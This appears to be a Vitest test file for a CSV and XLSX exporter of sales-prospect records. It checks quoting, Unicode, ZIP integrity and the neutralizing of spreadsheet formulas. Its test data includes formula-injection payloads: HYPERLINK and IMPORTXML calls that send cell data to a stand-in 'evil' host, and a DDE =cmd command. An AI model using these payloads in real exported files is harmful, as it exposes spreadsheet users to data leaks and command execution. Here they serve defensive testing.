import { describe, expect, it } from "vitest";
import { inflateRawSync } from "node:zlib";
import type { WorkspaceRow } from "@shared/prospect-workspace";
import { EXPORT_COLUMNS, columnsFor, crc32, neutralize, toCsv, toXlsx, xmlText } from "./export-format";

const row = (id: number, over: Partial<WorkspaceRow> = {}): WorkspaceRow => ({
  id, name: `Company ${id}`, domain: `c${id}.com`, website: `https://c${id}.com`,
  country: "US", location: "Austin, Texas", industry: "Digital marketing", serves: "SaaS", companySize: "12 people", sizeBucket: "11-50",
  contact: { findingId: 10 + id, name: "Ana Silva", title: "Founder & CEO", senior: true, email: null, emailStatus: null, source: "website", provider: null, sourceUrl: "https://c1.com/team", retrievedAt: "2026-10-02T08:00:00.000Z" },
  contactLevel: "decision_maker", emailStatus: "company_email", emailSource: "website", emailCheckedAt: "2026-10-02T08:00:00.000Z", companyEmail: "hello@c1.com", companyPhone: "+1 512 555 0100", phoneStatus: "company_phone",
  icpFit: "match", icpMatch: ["Industry matches", "Location matches"], icpUnmatched: [], readiness: "ready", readinessBlockers: [],
  latestEvidence: { at: "2026-09-01T00:00:00.000Z", date: "2026-09", precision: "month", title: "Launch", claim: "Launched a PPC practice", url: "https://c1.com/news", excerpt: "In September 2026 we launched", sourceType: "website", confidence: "high", freshness: "Last 3 months", status: "confirmed" },
  evidenceCount: 6, scoreTotal: 71, scoreConfidence: "medium", status: "ready", leadId: null, latestRunId: "r1", sources: ["brave"],
  createdAt: "2026-10-01T10:00:00.123Z", updatedAt: "2026-10-02T11:30:00.000Z", ...over,
});
const AT = "2026-10-13T09:30:00.456Z";

/** A strict CSV reader (RFC 4180): what a spreadsheet would see in each cell. */
function parseCsv(text: string): string[][] {
  const out: string[][] = []; let rowCells: string[] = []; let cell = ""; let i = 0; let quoted = false;
  while (i < text.length) {
    const c = text[i];
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') { cell += '"'; i += 2; continue; }
      if (c === '"') { quoted = false; i++; continue; }
      cell += c; i++; continue;
    }
    if (c === '"') { quoted = true; i++; continue; }
    if (c === ",") { rowCells.push(cell); cell = ""; i++; continue; }
    if (c === "\r" && text[i + 1] === "\n") { rowCells.push(cell); out.push(rowCells); rowCells = []; cell = ""; i += 2; continue; }
    throw new Error(`unquoted character at ${i}: ${JSON.stringify(c)}`);
  }
  if (cell || rowCells.length) throw new Error("file doesn't end with CRLF");
  return out;
}

/** Reads our ZIP back through its central directory, checking every CRC and size. */
function unzip(b: Buffer): Record<string, string> {
  const end = b.length - 22;
  expect(b.readUInt32LE(end)).toBe(0x06054b50);
  const n = b.readUInt16LE(end + 10), cdSize = b.readUInt32LE(end + 12), cdOff = b.readUInt32LE(end + 16);
  expect(cdOff + cdSize).toBe(end);
  const files: Record<string, string> = {};
  let p = cdOff;
  for (let k = 0; k < n; k++) {
    expect(b.readUInt32LE(p)).toBe(0x02014b50);
    const method = b.readUInt16LE(p + 10), crc = b.readUInt32LE(p + 16), comp = b.readUInt32LE(p + 20), size = b.readUInt32LE(p + 24), nameLen = b.readUInt16LE(p + 28), off = b.readUInt32LE(p + 42);
    const name = b.subarray(p + 46, p + 46 + nameLen).toString("utf8");
    expect(b.readUInt32LE(off)).toBe(0x04034b50);
    const localNameLen = b.readUInt16LE(off + 26), extra = b.readUInt16LE(off + 28);
    const data = inflateRawSync(b.subarray(off + 30 + localNameLen + extra, off + 30 + localNameLen + extra + comp));
    expect(method).toBe(8); expect(data.length).toBe(size); expect(crc32(data)).toBe(crc);
    files[name] = data.toString("utf8");
    p += 46 + nameLen;
  }
  return files;
}

describe("formula neutralizing", () => {
  it.each([
    ["=HYPERLINK(\"http://evil\",\"x\")", "'=HYPERLINK(\"http://evil\",\"x\")"], ["+1 512 555 0100", "'+1 512 555 0100"], ["-2+3", "'-2+3"], ["@SUM(A1)", "'@SUM(A1)"],
    ["  =cmd|' /C calc'!A0", "'  =cmd|' /C calc'!A0"], ["\t=1+1", "'\t=1+1"], ["\r=1", "'\r=1"], ["\n\n@x", "'\n\n@x"], ["\u0000=1", "'\u0000=1"],
    ["\u200b=1", "'\u200b=1"], ["\ufeff+1", "'\ufeff+1"], ["\u00a0-1", "'\u00a0-1"], ["\uff1d1+1", "'\uff1d1+1"], ["\tplain", "'\tplain"],
    ["Acme = best", "Acme = best"], ["hello@acme.com", "hello@acme.com"], ["Ünïcode GmbH", "Ünïcode GmbH"], ["", ""], ["2026-09", "2026-09"],
  ])("%j → %j", (input, out) => {
    expect(neutralize(input)).toBe(out);
  });
});

describe("CSV", () => {
  it("UTF-8 with a BOM, CRLF rows, every field quoted, the header in the stable order", () => {
    const b = toCsv([row(1)], EXPORT_COLUMNS, AT);
    expect([...b.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    const text = b.toString("utf8").slice(1);
    expect(text.endsWith("\r\n")).toBe(true);
    const [head, first] = parseCsv(text);
    expect(head).toEqual(EXPORT_COLUMNS.map((c) => c.key));
    expect(head.slice(0, 5)).toEqual(["prospect_id", "company_name", "company_domain", "company_website", "country"]);
    expect(head.slice(-3)).toEqual(["created_at", "updated_at", "exported_at"]);
    const v = Object.fromEntries(head.map((h, i) => [h, first[i]]));
    expect(v).toMatchObject({
      prospect_id: "1", company_name: "Company 1", primary_contact_name: "Ana Silva", primary_contact_role: "Founder & CEO", primary_contact_email: "",
      email_status: "company_email", email_verification_status: "", email_source_type: "website", email_last_checked_at: "2026-10-02T08:00:00Z",
      company_email: "hello@c1.com", company_phone: "'+1 512 555 0100", icp_fit: "Match", icp_match_reasons: "Industry matches; Location matches", icp_unmatched_reasons: "",
      research_readiness: "Ready", latest_evidence_date: "2026-09", evidence_count: "6", latest_evidence_title: "Launch: Launched a PPC practice",
      research_confidence: "medium", in_leads: "no", created_at: "2026-10-01T10:00:00Z", updated_at: "2026-10-02T11:30:00Z", exported_at: "2026-10-13T09:30:00Z",
    });
  });
  it("commas, quotes, newlines and Unicode survive exactly", () => {
    const name = 'Smith, "Jones" & Søn\nLtd — 株式会社';
    const [, first] = parseCsv(toCsv([row(1, { name, location: "Zürich, CH" })], EXPORT_COLUMNS, AT).toString("utf8").slice(1));
    expect(first[1]).toBe(name);
    expect(first[5]).toBe("Zürich, CH");
  });
  it("untrusted text that starts a formula is neutralized in every column", () => {
    const evil = "=IMPORTXML(CONCAT(\"http://evil/?\",A1),\"//a\")";
    const r = row(1, { name: evil, domain: "@evil.com", industry: " -1+1", location: "\t=1", companySize: "+5",
      contact: { ...row(1).contact!, name: evil, title: "@boss", email: "=x@evil.com", emailStatus: "verified" },
      icpMatch: ["=match"], latestEvidence: { ...row(1).latestEvidence!, claim: "x", title: "=title", excerpt: "+excerpt", url: "=url" } });
    const [, first] = parseCsv(toCsv([r], EXPORT_COLUMNS, AT).toString("utf8").slice(1));
    for (const cell of first) expect(/^[\s\u0000-\u001f]*[=+\-@]/.test(cell), cell).toBe(false);
  });
  it("missing values are empty, never guessed", () => {
    const r = row(2, { country: null, location: null, industry: null, companySize: null, contact: null, contactLevel: "none", emailStatus: "none", emailSource: null, emailCheckedAt: null, companyEmail: null, companyPhone: null, phoneStatus: "none", latestEvidence: null, scoreConfidence: null });
    const [head, first] = parseCsv(toCsv([r], EXPORT_COLUMNS, AT).toString("utf8").slice(1));
    const v = Object.fromEntries(head.map((h, i) => [h, first[i]]));
    for (const k of ["country", "location", "industry", "company_size", "primary_contact_name", "primary_contact_email", "email_last_checked_at", "company_email", "latest_evidence_date", "latest_evidence_url", "research_confidence"]) expect(v[k], k).toBe("");
    expect(v).toMatchObject({ email_status: "none", phone_status: "none", contact_level: "No named person" });
  });
  it("the companies preset has no named people", () => {
    const keys = columnsFor("companies").map((c) => c.key);
    for (const k of ["primary_contact_name", "primary_contact_role", "primary_contact_email", "email_verification_status", "contact_level"]) expect(keys).not.toContain(k);
    const text = toCsv([row(1)], columnsFor("companies"), AT).toString("utf8");
    expect(text).not.toContain("Ana Silva");
  });
  it("no internal fields: run ids, finding ids, raw sources or the organization", () => {
    const text = toCsv([row(1)], EXPORT_COLUMNS, AT).toString("utf8");
    for (const k of ["latestRunId", "r1", "findingId", "organization", "brave", "sourceUrl"]) expect(text).not.toContain(k);
  });
  it("rows keep the order given, and the same rows give the same bytes", () => {
    const rows = [row(3), row(1), row(2)];
    const a = toCsv(rows, EXPORT_COLUMNS, AT), b = toCsv(rows, EXPORT_COLUMNS, AT);
    expect(a.equals(b)).toBe(true);
    expect(parseCsv(a.toString("utf8").slice(1)).slice(1).map((r) => r[0])).toEqual(["3", "1", "2"]);
  });
});

describe("XLSX", () => {
  it("a valid package: content types, workbook, sheet, styles, every CRC right", () => {
    const files = unzip(toXlsx([row(1), row(2)], EXPORT_COLUMNS, AT));
    expect(Object.keys(files).sort()).toEqual(["[Content_Types].xml", "_rels/.rels", "xl/_rels/workbook.xml.rels", "xl/styles.xml", "xl/workbook.xml", "xl/worksheets/sheet1.xml"]);
    expect(files["[Content_Types].xml"]).toContain('PartName="/xl/worksheets/sheet1.xml"');
    const last = (i: number): string => (i < 26 ? String.fromCharCode(65 + i) : last(Math.floor(i / 26) - 1) + String.fromCharCode(65 + (i % 26)));
    expect(files["xl/worksheets/sheet1.xml"]).toContain(`<dimension ref="A1:${last(EXPORT_COLUMNS.length - 1)}3"/>`);
    expect(files["xl/workbook.xml"]).toContain(`Prospects!$A$1:$${last(EXPORT_COLUMNS.length - 1)}$3`);
  });
  it("untrusted text is an inline string cell, never a formula; integers are numbers", () => {
    const evil = "=HYPERLINK(\"http://evil\",\"click\")";
    const sheet = unzip(toXlsx([row(1, { name: evil, industry: "<script>&amp;</script>" })], EXPORT_COLUMNS, AT))["xl/worksheets/sheet1.xml"];
    expect(sheet).not.toMatch(/<f[ >]/);
    expect(sheet).toContain(`<c r="B2" t="inlineStr"><is><t xml:space="preserve">=HYPERLINK(&quot;http://evil&quot;,&quot;click&quot;)</t></is></c>`);
    expect(sheet).toContain("&lt;script&gt;&amp;amp;&lt;/script&gt;");
    expect(sheet).toContain(`<c r="A2"><v>1</v></c>`);
    const cells = sheet.match(/<c [^>]*>/g)!;
    for (const c of cells) expect(c.includes('t="inlineStr"') || !c.includes(" t=")).toBe(true);
  });
  it("Unicode is kept; characters XML forbids are dropped, not written", () => {
    const sheet = unzip(toXlsx([row(1, { name: "Søn 株式会社 \u0001\u0008bad\ud800" })], EXPORT_COLUMNS, AT))["xl/worksheets/sheet1.xml"];
    expect(sheet).toContain("Søn 株式会社 bad<");
    expect(xmlText("a\u0000b\u000bc\ufffed😀")).toBe("abcd😀");
  });
  it("header row first, then one row per prospect; empty values leave the cell out", () => {
    const sheet = unzip(toXlsx([row(1, { country: null })], EXPORT_COLUMNS, AT))["xl/worksheets/sheet1.xml"];
    expect(sheet).toContain(`<c r="A1" t="inlineStr" s="1"><is><t xml:space="preserve">prospect_id</t></is></c>`);
    expect(sheet).not.toContain(`r="E2"`);
    expect((sheet.match(/<row /g) ?? []).length).toBe(2);
  });
  it("deterministic bytes", () => {
    expect(toXlsx([row(1)], EXPORT_COLUMNS, AT).equals(toXlsx([row(1)], EXPORT_COLUMNS, AT))).toBe(true);
  });
  it("crc32 matches the standard check value", () => {
    expect(crc32(Buffer.from("123456789"))).toBe(0xcbf43926);
  });
});
